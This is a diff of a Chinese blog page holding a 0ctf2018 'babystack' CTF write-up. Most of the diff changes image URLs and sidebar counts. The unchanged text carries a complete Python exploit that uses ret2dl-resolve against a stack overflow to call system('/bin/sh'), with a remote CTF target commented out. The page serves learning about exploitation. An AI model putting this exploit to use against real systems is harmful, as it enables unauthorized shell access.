@@ -89,14 +89,14 @@
 <meta property="og:site_name" content="Sakuraのblog">
 <meta property="og:description" content="赛题链接https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack 前置技能ret2dl in x86没有能用来leak的漏洞。如下面的代码,除了明显的栈溢出，没有可以用来leak内存布局，bypass aslr的函数。12345678910111213141516#include &amp;lt;stdio.h&amp;gt;#">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-01-092544.png">
-<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-01-092629.png">
-<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-01-091535.png">
-<meta property="og:updated_time" content="2018-04-03T11:50:11.000Z">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092544.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092629.png">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-091535.png">
+<meta property="og:updated_time" content="2018-10-22T14:25:51.721Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0ctf2018 babystack writeup">
 <meta name="twitter:description" content="赛题链接https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack 前置技能ret2dl in x86没有能用来leak的漏洞。如下面的代码,除了明显的栈溢出，没有可以用来leak内存布局，bypass aslr的函数。12345678910111213141516#include &amp;lt;stdio.h&amp;gt;#">
-<meta name="twitter:image" content="http://onc55v8te.bkt.clouddn.com/2018-04-01-092544.png">
+<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092544.png">
 
 
 
@@ -452,13 +452,13 @@
         <h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/0ctf2018/babystack</a></p>
 <h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="ret2dl-in-x86"><a href="#ret2dl-in-x86" class="headerlink" title="ret2dl in x86"></a>ret2dl in x86</h3><p>没有能用来leak的漏洞。<br>如下面的代码,除了明显的栈溢出，没有可以用来leak内存布局，bypass aslr的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulfunc()</span><br><span class="line">&#123;</span><br><span class="line">    char sbuf[10];</span><br><span class="line">    read(0, sbuf, 60);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vulfunc();</span><br><span class="line">    exit(0);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>本来想写一下原理的，不过其他资料已经讲得非常好了，实在没什么可补充的（其实是我还不怎么懂）。<br><a href="https://www.slideshare.net/AngelBoy1/re2dlresolve" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/re2dlresolve</a><br><a href="http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">http://www.inforsec.org/wp/wp-content/uploads/2016/01/sec15-paper-di-frederico.pdf</a><br><a href="http://skysider.com/?p=416" target="_blank" rel="noopener">http://skysider.com/?p=416</a><br>学习过程中最好找个程序，然后对着_dl_runtime_resolve源码服用，效果更佳，然后再看图就思路清晰了。</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>alarm用keypatch先nop掉<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-092544.png" alt=""><br>可以看出有很明显的栈溢出漏洞，但是只有一个read，没有可以用来leak的函数，所以用ret2dl的解法<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-092629.png" alt=""></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>alarm用keypatch先nop掉<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092544.png" alt=""><br>可以看出有很明显的栈溢出漏洞，但是只有一个read，没有可以用来leak的函数，所以用ret2dl的解法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-092629.png" alt=""></p>
 <h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
 <li>通过栈溢出来调用read函数在bss段写我们需要的结构和/bin/sh</li>
 <li>然后使用dl_resolve_call去调用system，得到shell。</li>
 </ol>
 <h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">readplt = <span class="number">0x08048300</span></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">vulFunc = <span class="number">0x0804843B</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment"># p = remote('202.120.7.202', 6666)</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getReloc</span><span class="params">(elf, base)</span>:</span></span><br><span class="line">    jmprel = elf.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">    relent = elf.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    <span class="keyword">return</span> reloc_offset</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">'./babystack'</span>)</span><br><span class="line">addr_bss = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 : write sh &amp; resolve struct to bss</span></span><br><span class="line">buf1 = <span class="string">'A'</span> * offset <span class="comment">#44</span></span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 : use dl_resolve_call get system &amp; system('/bin/sh')</span></span><br><span class="line">buf3 = <span class="string">'A'</span>*<span class="number">44</span> + rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-01-091535.png" alt=""></p>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-01-091535.png" alt=""></p>
 <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ret2dl方法是hook师傅教我的，我也没全看懂，只是理解了基本思路后，整个过程用roputils工具来实现的,工具我放在了我的<a href="https://github.com/eternalsakura/ctf_pwn/blob/master/roputils.py" target="_blank" rel="noopener">github</a>上。<br>依然不懂怎么手工构造，而且程序再换成64位也就不会，还要学习一下。</p>
 
       
@@ -593,7 +593,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">97</span>
+                  <span class="site-state-item-count">95</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -604,7 +604,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -615,7 +615,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
